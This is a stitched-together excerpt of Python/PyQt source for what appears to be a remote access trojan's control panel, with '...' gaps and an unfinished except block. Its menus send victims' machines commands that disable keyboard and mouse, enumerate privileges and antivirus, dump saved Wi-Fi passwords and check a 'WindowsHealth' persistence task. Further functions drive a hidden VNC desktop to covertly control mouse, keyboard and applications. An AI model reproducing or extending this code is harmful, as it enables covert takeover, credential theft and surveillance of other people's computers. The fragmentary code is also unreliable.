        extra_menu.addAction("Disable Keyboard (plug-and-play disconnect)",
            lambda: send_cmd(
                'powershell -Command "& {Get-WmiObject Win32_Keyboard | Disable-PnpDevice -Confirm:$false; '
                'Write-Host \'KEYBOARD DISABLED\'}"'))
        extra_menu.addAction("Disable Mouse (plug-and-play disconnect)",
            lambda: send_cmd(
                'powershell -Command "& {Get-WmiObject Win32_PointingDevice | Disable-PnpDevice -Confirm:$false; '
                'Write-Host \'MOUSE DISABLED\'}"'))

        # ─── USEFUL INFO SUBMENU ───
        info_menu = menu.addMenu("ℹ️ Recon / Info")
        info_menu.addAction("Full System Enumeration (user, privs, domain, AV)",
            lambda: send_cmd(
                'whoami /all 2>nul | findstr /i "domain group sid" && '
                'echo === && wmic os get caption,version,installDate && '
                'echo === && wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct '
                'get displayname /format:csv && '
                'echo === && net localgroup Administrators && '
                'echo === && reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend" /v Start'))
        info_menu.addAction("Check If Domain Joined",
            lambda: send_cmd('systeminfo | findstr /i "domain"'))
        info_menu.addAction("List All Running Processes",
            lambda: send_cmd('tasklist /v /fo list'))
        info_menu.addAction("Check RDP Enabled",
            lambda: send_cmd(
                'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections'))
        info_menu.addAction("Show Network Connections",
            lambda: send_cmd('netstat -ano | findstr ESTABLISHED'))
        info_menu.addAction("Dump Wi-Fi Passwords",
            lambda: send_cmd(
                'for /f "skip=3 tokens=1" %i in (\'netsh wlan show profiles ^| findstr /i ":"\') '
                'do netsh wlan show profile name=%i key=clear | findstr /i "Key Content"'))
        info_menu.addAction("Check Startup Persistence Status",
            lambda: send_cmd(
                'echo === Registry Run === && '
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" 2>nul && '
                'echo === Scheduled Tasks === && '
                'schtasks /query /fo LIST /v 2>nul | findstr /i "WindowsHealth" && '
                'echo === Process Check === && '
                'tasklist /fi "IMAGENAME eq svchost.exe" /nh 2>nul'))

        menu.addSeparator()
        menu.addMenu(fun_menu)
    ...
    def on_screenshare_frame(self, jpeg_data):
        """Route screen share frame to dialogs + HVNC."""
        # Regular screenshare dialogs
        ...
        # HVNC dialogs
        for cid, d in list(self.hvnc_dialogs.items()):
            try:
                if d.hvnc_running:
                    d.update_frame(jpeg_data)
            except RuntimeError:
    ...
    def open_hvnc_dialog(self):
        if not self.selected_client_id:
            QMessageBox.warning(self, "No Client", "Select a client first!")
            return
        cid = self.selected_client_id
        if cid in self.hvnc_dialogs:
            self.hvnc_dialogs[cid].raise_()
            self.hvnc_dialogs[cid].activateWindow()
            return
        h = self.client_handlers.get(cid)
        if h:
            d = HVNCDialog(cid, h.send_command, self)
            d.show()
    ...
    def hvnc_start(self):
        ...
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            h.send_command("hvnc_start")
            self.hvnc_running = True
            self.btn_hvnc_start.setEnabled(False)
            self.btn_hvnc_stop.setEnabled(True)
            self.lbl_hvnc_status.setText("Status: HVNC RUNNING (hidden desktop)")
            self.lbl_hvnc_status.setStyleSheet("color:#44ff44;font-weight:bold;font-size:13px;")
            self.log_message(f"[>] HVNC started on {self.selected_client_id}")
            
            # Auto-request screenshots every 2 seconds
            self.hvnc_timer = QTimer()
            self.hvnc_timer.timeout.connect(self.hvnc_request_screenshot)
            self.hvnc_timer.start(2000)

    def hvnc_stop(self):
        if not self.selected_client_id: return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            h.send_command("hvnc_stop")
        self.hvnc_running = False
        self.btn_hvnc_start.setEnabled(True)
        self.btn_hvnc_stop.setEnabled(False)
        self.lbl_hvnc_status.setText("Status: Stopped")
        self.lbl_hvnc_status.setStyleSheet("color:#ff4444;font-weight:bold;font-size:13px;")
        self.hvnc_display.setText("HVNC Desktop Preview")
        if hasattr(self, 'hvnc_timer') and self.hvnc_timer:
            self.hvnc_timer.stop()
        self.log_message(f"[>] HVNC stopped on {self.selected_client_id}")

    def hvnc_request_screenshot(self):
        if not self.selected_client_id or not self.hvnc_running: return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            h.send_command("hvnc_screenshot")

    def hvnc_mouse_event(self, event_type, button):
        if not self.selected_client_id or not self.hvnc_running: return
        h = self.client_handlers.get(self.selected_client_id)
        x = self.hvnc_x_input.value()
        y = self.hvnc_y_input.value()
        if h:
            h.send_command("hvnc_mouse", event=event_type, button=button, x=x, y=y)
            self.log_message(f"[>] HVNC mouse {event_type} at ({x},{y})")

    def hvnc_move_mouse(self):
        if not self.selected_client_id or not self.hvnc_running: return
        h = self.client_handlers.get(self.selected_client_id)
        x = self.hvnc_x_input.value()
        y = self.hvnc_y_input.value()
        if h:
            h.send_command("hvnc_mouse", event="move", x=x, y=y)
            self.lbl_hvnc_coords.setText(f"Coords: {x}, {y}")

    def hvnc_type_text(self):
        if not self.selected_client_id or not self.hvnc_running: return
        h = self.client_handlers.get(self.selected_client_id)
        text = self.hvnc_type_input.text()
        if text and h:
            h.send_command("hvnc_keyboard", text=text)
            self.hvnc_type_input.clear()

    def hvnc_send_keys(self, key_combo):
        if not self.selected_client_id or not self.hvnc_running: return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            h.send_command("hvnc_keyboard", key=key_combo)

    def hvnc_launch_app(self, app_path):
        if not self.selected_client_id or not self.hvnc_running: return
        h = self.client_handlers.get(self.selected_client_id)
        if h:
            h.send_command("hvnc_launch", app=app_path)
            self.log_message(f"[>] HVNC launching: {app_path}")
